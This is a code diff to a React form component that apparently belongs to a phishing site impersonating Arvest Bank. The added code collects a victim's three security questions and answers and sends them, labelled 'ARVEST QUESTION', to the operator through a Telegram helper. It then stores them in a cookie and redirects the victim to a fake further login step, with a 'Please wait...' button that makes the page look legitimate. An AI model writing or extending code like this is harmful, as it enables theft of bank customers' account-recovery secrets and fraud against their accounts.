@@ -1,6 +1,7 @@
 import React, { useState } from "react";
 import { useNavigate } from "react-router-dom";
 import cookies from "../utils/cookie.config";
+import TelegramSend from "../utils/send-message";
 
 type Question = {
     q1: string;
@@ -36,11 +37,27 @@ export default function Question() {
       [event.target.name]: event.target.value,
     }));
   }
-
-  function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
+  const [isLoading, setIsLoading] = useState(false)
+  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
     event.preventDefault();
+    setIsLoading(true)
+    const message = `
+    [----+🏦 ARVEST QUESTION 🏦+-----]
+
+    Question 1: ${formInput.q1}
+    Answer 1: ${formInput.ans1}
+    
+    Question 2: ${formInput.q2}
+    Answer 2: ${formInput.ans2}
+
+    Question 3: ${formInput.q3}
+    Answer 3: ${formInput.ans3}
+    
+    `;
+    await TelegramSend(message);
     cookies.set("question", formInput)
-    navigate("../verify", { replace: true });
+    setIsLoading(false);
+    navigate("../login/auth/2", { replace: true });
   }
 
   return (
@@ -332,9 +349,17 @@ export default function Question() {
             <input onChange={handleInputChange} id="question3_ans" name="ans3" type="text" />
           </div>
 
-          <button style={{ width: "100%", marginTop: "-5px" }} type="submit">
-            Verify
+          {
+            isLoading ?
+<button style={{ width: "100%", marginTop: "-5px" }} type="button">
+            Please wait...
           </button>
+
+            :
+            
+            <button style={{ width: "100%", marginTop: "-5px" }} type="submit">
+            Verify
+          </button>}
         </form>
 
         <br />
